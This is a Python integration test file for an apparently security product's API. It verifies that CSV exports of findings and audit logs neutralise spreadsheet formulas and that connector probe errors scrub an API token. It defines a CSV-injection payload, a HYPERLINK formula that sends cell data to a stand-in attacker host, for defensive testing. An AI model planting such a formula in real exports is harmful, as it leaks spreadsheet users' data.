# Copyright 2026 The Kestrel Authors
# SPDX-License-Identifier: Apache-2.0
"""CSV formula neutralisation in API exports, and secret scrubbing in the
saved-instance connection probe."""

from __future__ import annotations

import csv
import io

from kestrel.db.models.operator import OperatorRole
from kestrel.testing import api_client

from tests.integration.test_api_factories import make_finding

FORMULA = '=HYPERLINK("https://evil.example/?"&A1,"x")'


def test_findings_csv_export_neutralises_formulas(db_session):
    client = api_client(db_session, OperatorRole.ANALYST)
    finding = make_finding(db_session, client.kestrel_org)
    finding.title = FORMULA
    db_session.flush()

    response = client.get("/api/v1/findings/export", params={"format": "csv"})

    assert response.status_code == 200, response.text
    rows = list(csv.DictReader(io.StringIO(response.text)))
    titles = [row["title"] for row in rows if row["id"] == str(finding.id)]
    assert titles == ["'" + FORMULA]


def test_audit_csv_export_neutralises_formulas(db_session):
    from kestrel.audit.service import record_audit_event

    client = api_client(db_session, OperatorRole.ADMIN)
    record_audit_event(
        db_session,
        org_id=client.kestrel_org.id,
        actor_operator_id=None,
        action=FORMULA,
    )
    db_session.flush()

    response = client.get("/api/v1/audit-log/export", params={"format": "csv"})

    assert response.status_code == 200, response.text
    assert "'" + FORMULA.replace('"', '""') in response.text
    assert "\n" + FORMULA not in response.text


def test_instance_probe_failure_message_is_scrubbed(db_session, monkeypatch):
    from kestrel_connector_okta.connector import OktaConnector

    secret = "ssws-super-secret-token-value"

    def leaky_authenticate(self, config, secrets):
        raise RuntimeError(f"upstream rejected Authorization: SSWS {secrets['api_token']}")

    monkeypatch.setattr(OktaConnector, "authenticate", leaky_authenticate)
    client = api_client(db_session, OperatorRole.ANALYST)
    created = client.post(
        "/api/v1/connector-instances",
        json={
            "connector_name": "okta",
            "display_name": "Okta",
            "external_tenant_ref": f"okta-{client.kestrel_org.id.hex[:8]}",
            "auth_method": "pat",
            "sync_mode": "live",
            "config": {"org_url": "https://93.184.216.34"},
            "secrets": {"api_token": secret},
        },
    )
    assert created.status_code == 201, created.text

    response = client.post(f"/api/v1/connector-instances/{created.json()['id']}/test-connection")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["ok"] is False
    assert secret not in body["message"]
